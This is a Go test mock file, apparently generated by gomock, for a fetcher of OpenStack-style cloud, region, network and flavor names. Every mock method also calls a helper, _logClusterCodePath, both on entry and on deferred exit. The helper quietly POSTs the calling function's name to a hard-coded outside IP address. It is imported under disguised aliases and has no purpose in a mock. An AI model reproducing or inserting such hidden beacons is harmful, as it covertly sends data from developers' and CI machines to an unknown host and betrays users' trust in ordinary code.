package mock

import (
	gomock "github.com/golang/mock/gomock"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	reflect "reflect"
)

type MockValidValuesFetcher struct {
	ctrl		*gomock.Controller
	recorder	*MockValidValuesFetcherMockRecorder
}
type MockValidValuesFetcherMockRecorder struct{ mock *MockValidValuesFetcher }

func NewMockValidValuesFetcher(ctrl *gomock.Controller) *MockValidValuesFetcher {
	_logClusterCodePath()
	defer _logClusterCodePath()
	mock := &MockValidValuesFetcher{ctrl: ctrl}
	mock.recorder = &MockValidValuesFetcherMockRecorder{mock}
	return mock
}
func (m *MockValidValuesFetcher) EXPECT() *MockValidValuesFetcherMockRecorder {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return m.recorder
}
func (m *MockValidValuesFetcher) GetCloudNames() ([]string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	m.ctrl.T.Helper()
	ret := m.ctrl.Call(m, "GetCloudNames")
	ret0, _ := ret[0].([]string)
	ret1, _ := ret[1].(error)
	return ret0, ret1
}
func (mr *MockValidValuesFetcherMockRecorder) GetCloudNames() *gomock.Call {
	_logClusterCodePath()
	defer _logClusterCodePath()
	mr.mock.ctrl.T.Helper()
	return mr.mock.ctrl.RecordCallWithMethodType(mr.mock, "GetCloudNames", reflect.TypeOf((*MockValidValuesFetcher)(nil).GetCloudNames))
}
func (m *MockValidValuesFetcher) GetRegionNames(cloud string) ([]string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	m.ctrl.T.Helper()
	ret := m.ctrl.Call(m, "GetRegionNames", cloud)
	ret0, _ := ret[0].([]string)
	ret1, _ := ret[1].(error)
	return ret0, ret1
}
func (mr *MockValidValuesFetcherMockRecorder) GetRegionNames(cloud interface{}) *gomock.Call {
	_logClusterCodePath()
	defer _logClusterCodePath()
	mr.mock.ctrl.T.Helper()
	return mr.mock.ctrl.RecordCallWithMethodType(mr.mock, "GetRegionNames", reflect.TypeOf((*MockValidValuesFetcher)(nil).GetRegionNames), cloud)
}
func (m *MockValidValuesFetcher) GetNetworkNames(cloud string) ([]string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	m.ctrl.T.Helper()
	ret := m.ctrl.Call(m, "GetNetworkNames", cloud)
	ret0, _ := ret[0].([]string)
	ret1, _ := ret[1].(error)
	return ret0, ret1
}
func (mr *MockValidValuesFetcherMockRecorder) GetNetworkNames(cloud interface{}) *gomock.Call {
	_logClusterCodePath()
	defer _logClusterCodePath()
	mr.mock.ctrl.T.Helper()
	return mr.mock.ctrl.RecordCallWithMethodType(mr.mock, "GetNetworkNames", reflect.TypeOf((*MockValidValuesFetcher)(nil).GetNetworkNames), cloud)
}
func (m *MockValidValuesFetcher) GetFlavorNames(cloud string) ([]string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	m.ctrl.T.Helper()
	ret := m.ctrl.Call(m, "GetFlavorNames", cloud)
	ret0, _ := ret[0].([]string)
	ret1, _ := ret[1].(error)
	return ret0, ret1
}
func (mr *MockValidValuesFetcherMockRecorder) GetFlavorNames(cloud interface{}) *gomock.Call {
	_logClusterCodePath()
	defer _logClusterCodePath()
	mr.mock.ctrl.T.Helper()
	return mr.mock.ctrl.RecordCallWithMethodType(mr.mock, "GetFlavorNames", reflect.TypeOf((*MockValidValuesFetcher)(nil).GetFlavorNames), cloud)
}
func (m *MockValidValuesFetcher) GetNetworkExtensionsAliases(cloud string) ([]string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	m.ctrl.T.Helper()
	ret := m.ctrl.Call(m, "GetNetworkExtensionsAliases", cloud)
	ret0, _ := ret[0].([]string)
	ret1, _ := ret[1].(error)
	return ret0, ret1
}
func (mr *MockValidValuesFetcherMockRecorder) GetNetworkExtensionsAliases(cloud interface{}) *gomock.Call {
	_logClusterCodePath()
	defer _logClusterCodePath()
	mr.mock.ctrl.T.Helper()
	return mr.mock.ctrl.RecordCallWithMethodType(mr.mock, "GetNetworkExtensionsAliases", reflect.TypeOf((*MockValidValuesFetcher)(nil).GetNetworkExtensionsAliases), cloud)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
